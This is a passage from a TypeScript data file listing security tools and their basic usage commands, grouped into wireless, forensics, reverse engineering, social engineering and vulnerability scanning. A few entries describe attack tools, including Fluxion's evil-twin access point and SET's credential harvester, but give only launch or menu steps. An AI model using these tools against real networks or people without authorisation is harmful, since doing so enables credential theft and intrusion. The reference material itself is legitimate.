    tags: ["Automation", "WiFi Auditing", "Multi-Attack"],
  },
  {
    category: "Wireless Security",
    name: "Kismet",
    slug: "kismet",
    level: "Intermediate",
    use: "Wireless network detector and sniffer",
    description:
      "Detects, sniffs, and intrusion detection system for 802.11 wireless LANs. Works with any wireless card supporting raw monitoring mode.",
    commands: [
      "kismet",
      "kismet -c wlan0",
      "kismet_server -c wlan0",
    ],
    tags: ["WiFi Detection", "IDS", "Sniffing"],
  },
  {
    category: "Wireless Security",
    name: "Fluxion",
    slug: "fluxion",
    level: "Advanced",
    use: "WiFi social engineering attack",
    description:
      "Creates a fake AP to capture WPA/WPA2 handshakes and crack them using social engineering techniques.",
    commands: [
      "./fluxion.sh",
      "Select interface and target",
      "Create evil twin AP",
    ],
    tags: ["Evil Twin", "Social Engineering", "WiFi"],
  },

  // FORENSICS
  {
    category: "Forensics",
    name: "Autopsy",
    slug: "autopsy",
    level: "Intermediate",
    use: "Digital forensics platform and GUI for Sleuth Kit",
    description:
      "Open source digital forensics platform for analyzing hard drives and smartphones. Used by law enforcement and corporate examiners.",
    commands: [
      "autopsy",
      "Create new case",
      "Add data source",
      "Run ingest modules",
    ],
    tags: ["Disk Forensics", "Investigation", "Data Recovery"],
  },
  {
    category: "Forensics",
    name: "Volatility",
    slug: "volatility",
    level: "Advanced",
    use: "Advanced memory forensics framework",
    description:
      "Extracts digital artifacts from RAM samples. Analyzes running processes, network connections, kernel modules, and more.",
    commands: [
      "volatility -f memory.dump imageinfo",
      "volatility -f memory.dump --profile=Win7SP1x64 pslist",
      "volatility -f memory.dump --profile=Win7SP1x64 netscan",
      "volatility -f memory.dump --profile=Win7SP1x64 cmdline",
    ],
    tags: ["Memory Forensics", "RAM Analysis", "Incident Response"],
  },
  {
    category: "Forensics",
    name: "Binwalk",
    slug: "binwalk",
    level: "Intermediate",
    use: "Firmware analysis and extraction",
    description:
      "Tool for analyzing, reverse engineering, and extracting firmware images. Identifies embedded files and executable code.",
    commands: [
      "binwalk firmware.bin",
      "binwalk -e firmware.bin",
      "binwalk -Me firmware.bin",
      "binwalk --signature firmware.bin",
    ],
    tags: ["Firmware Analysis", "File Extraction", "IoT Security"],
  },
  {
    category: "Forensics",
    name: "Foremost",
    slug: "foremost",
    level: "Beginner",
    use: "File recovery based on headers and footers",
    description:
      "Console program to recover files based on their headers, footers, and internal data structures (file carving).",
    commands: [
      "foremost -i disk.img",
      "foremost -t pdf,jpg,png -i disk.img",
      "foremost -i disk.img -o output_dir",
    ],
    tags: ["File Carving", "Data Recovery", "Deleted Files"],
  },
  {
    category: "Forensics",
    name: "Steghide",
    slug: "steghide",
    level: "Beginner",
    use: "Steganography detection and extraction",
    description:
      "Embeds and extracts hidden data in various kinds of image and audio files. Supports encryption of embedded data.",
    commands: [
      "steghide embed -cf image.jpg -ef secret.txt",
      "steghide extract -sf image.jpg",
      "steghide info image.jpg",
    ],
    tags: ["Steganography", "Hidden Data", "Image Analysis"],
  },

  // REVERSE ENGINEERING
  {
    category: "Reverse Engineering",
    name: "Ghidra",
    slug: "ghidra",
    level: "Advanced",
    use: "NSA's software reverse engineering suite",
    description:
      "Software reverse engineering framework developed by NSA. Includes disassembler, decompiler, and scripting capabilities.",
    commands: [
      "ghidraRun",
      "Import binary file",
      "Auto-analyze",
      "Browse decompiled code",
    ],
    tags: ["Disassembler", "Decompiler", "Malware Analysis"],
  },
  {
    category: "Reverse Engineering",
    name: "Radare2",
    slug: "radare2",
    level: "Advanced",
    use: "Unix-like reverse engineering framework",
    description:
      "Portable reversing framework with disassembler, debugger, binary analysis, and hex editor. Scriptable and customizable.",
    commands: [
      "r2 binary",
      "aaa (analyze all)",
      "pdf @ main (disassemble function)",
      "VV (visual mode)",
    ],
    tags: ["Disassembly", "Debugging", "Binary Analysis"],
  },
  {
    category: "Reverse Engineering",
    name: "OllyDbg",
    slug: "ollydbg",
    level: "Intermediate",
    use: "32-bit assembler level debugger (Windows)",
    description:
      "Analyzes binary code. Useful for debugging malware and cracking software protections. Windows-focused tool.",
    commands: [
      "Open executable in OllyDbg",
      "F9 (Run)",
      "F8 (Step over)",
      "F7 (Step into)",
    ],
    tags: ["Debugger", "Windows", "x86"],
  },
  {
    category: "Reverse Engineering",
    name: "IDA Pro",
    slug: "ida-pro",
    level: "Advanced",
    use: "Professional disassembler and debugger",
    description:
      "Industry standard for reverse engineering. Multi-processor disassembler and debugger with interactive interface.",
    commands: [
      "Launch IDA Pro",
      "Load target binary",
      "Analyze with F5 decompiler",
      "Use scripting with IDAPython",
    ],
    tags: ["Commercial", "Disassembly", "Professional"],
  },
  {
    category: "Reverse Engineering",
    name: "Strings",
    slug: "strings",
    level: "Beginner",
    use: "Extract printable strings from binaries",
    description:
      "Simple but powerful tool for extracting readable text from binary files. First step in malware analysis.",
    commands: [
      "strings binary",
      "strings -n 10 binary",
      "strings binary | grep http",
      "strings -e l binary (Unicode)",
    ],
    tags: ["String Extraction", "Binary Analysis", "Quick Analysis"],
  },

  // SOCIAL ENGINEERING
  {
    category: "Social Engineering",
    name: "Social-Engineer Toolkit (SET)",
    slug: "set",
    level: "Intermediate",
    use: "Framework for social engineering attacks",
    description:
      "Open-source penetration testing framework for social engineering. Includes spear-phishing, website cloning, and payload delivery.",
    commands: [
      "setoolkit",
      "1) Social-Engineering Attacks",
      "2) Website Attack Vectors",
      "3) Credential Harvester",
    ],
    tags: ["Phishing", "Social Engineering", "Attack Vectors"],
  },
  {
    category: "Social Engineering",
    name: "Gophish",
    slug: "gophish",
    level: "Beginner",
    use: "Open-source phishing simulation framework",
    description:
      "Platform for testing organization's exposure to phishing. Create and send phishing campaigns, track results.",
    commands: [
      "./gophish",
      "Access dashboard: https://localhost:3333",
      "Create campaign",
      "Monitor results",
    ],
    tags: ["Phishing", "Awareness Training", "Simulation"],
  },
  {
    category: "Social Engineering",
    name: "King Phisher",
    slug: "king-phisher",
    level: "Intermediate",
    use: "Phishing campaign toolkit",
    description:
      "Tool for testing and promoting user awareness through simulated phishing attacks with email and web components.",
    commands: [
      "king-phisher-server",
      "king-phisher-client",
      "Configure SMTP settings",
      "Launch campaign",
    ],
    tags: ["Phishing", "Email Campaigns", "Training"],
  },

  // VULNERABILITY SCANNING
  {
    category: "Vulnerability Scanning",
    name: "Nessus",
    slug: "nessus",
    level: "Intermediate",
    use: "Professional vulnerability scanner",
    description:
      "Industry-leading vulnerability assessment solution. Identifies vulnerabilities, configuration issues, and malware.",
    commands: [
      "/etc/init.d/nessusd start",
      "Access Web UI: https://localhost:8834",
      "Create scan policy",
      "Run comprehensive scan",
    ],
    tags: ["Vulnerability Assessment", "Compliance", "Commercial"],
  },
  {
    category: "Vulnerability Scanning",
    name: "OpenVAS",
    slug: "openvas",
    level: "Intermediate",
    use: "Open-source vulnerability scanner",
    description:
      "Full-featured vulnerability scanner with daily updated feed of Network Vulnerability Tests (NVTs).",
    commands: [
      "openvas-setup",
      "openvas-start",
      "Access Greenbone Security Assistant",
      "Create and run scan tasks",
    ],
    tags: ["Open Source", "Vulnerability Scanning", "Network Security"],
  },
  {
    category: "Vulnerability Scanning",
    name: "Lynis",
    slug: "lynis",
    level: "Beginner",
    use: "Security auditing tool for Unix systems",
    description:
      "Performs security scans on Linux/Unix systems. Checks system hardening, compliance, and configuration issues.",
    commands: [
      "lynis audit system",
      "lynis show profiles",
      "lynis audit system --quick",
      "lynis show categories",
    ],
    tags: ["System Audit", "Hardening", "Compliance"],
  },
  {
    category: "Vulnerability Scanning",
    name: "Nuclei",
    slug: "nuclei",
    level: "Intermediate",
    use: "Fast vulnerability scanner based on templates",
    description:
      "Modern vulnerability scanner with template-based approach. Community-powered with thousands of templates for various vulnerabilities.",
    commands: [
      "nuclei -u https://target.com",
      "nuclei -l targets.txt",
      "nuclei -t cves/ -u https://target.com",
      "nuclei -u https://target.com -severity critical,high",
    ],
    tags: ["Template-Based", "Fast Scanning", "CVE Detection"],
  },
  {
    category: "Vulnerability Scanning",
    name: "Wapiti",
    slug: "wapiti",
    level: "Beginner",
    use: "Web application vulnerability scanner",
    description:
      "Web vulnerability scanner that audits web applications for security flaws including XSS, SQL injection, and file disclosure.",
    commands: [
      "wapiti -u http://target.com",
      "wapiti -u http://target.com -m sql,xss",
      "wapiti -u http://target.com -f html -o report",
    ],
    tags: ["Web Scanner", "Black Box", "Automated"],
  },
];

// ─────────────────────────────────────────────
// DERIVED HELPERS
// ─────────────────────────────────────────────

export const toolCategories = Array.from(
  new Set(cyberTools.map((t) => t.category))
).sort() as CyberTool["category"][];

export const allPlatformCategories = Array.from(
  new Set(platforms.map((p) => p.category))
).sort() as Platform["category"][];

export const skillLevels: CyberTool["level"][] = [
  "Beginner",
  "Intermediate",
  "Advanced",
];

export const toolCount = cyberTools.length;
export const platformCount = platforms.length;
export const categoryCount = toolCategories.length;